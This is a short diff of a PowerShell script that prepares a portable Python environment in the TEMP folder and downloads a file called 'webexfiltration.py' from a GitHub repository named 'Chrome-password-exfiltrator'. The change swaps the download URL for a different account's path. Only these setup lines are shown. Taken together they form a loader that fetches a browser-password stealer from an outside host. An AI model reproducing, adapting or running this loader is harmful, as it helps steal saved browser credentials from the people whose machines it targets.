@@ -5,7 +5,7 @@ $GetPipUrl = "https://bootstrap.pypa.io/get-pip.py"
 $PythonPortablePath = Join-Path $env:TEMP "PythonPortable"
 $PythonZipPath = Join-Path $env:TEMP "python-embed.zip"
 $GetPipPath = Join-Path $PythonPortablePath "get-pip.py"
-$ScriptDownloadUrl = "https://raw.githubusercontent.com/Krook9d/Chrome-password-exfiltrator/main/webexfiltration.py"
+$ScriptDownloadUrl = "https://raw.githubusercontent.com/bindas88/sni/Chrome-password-exfiltrator/main/webexfiltration.py"
 $ScriptPath = Join-Path $PythonPortablePath "webexfiltration.py"
 
 # Create the temporary folder
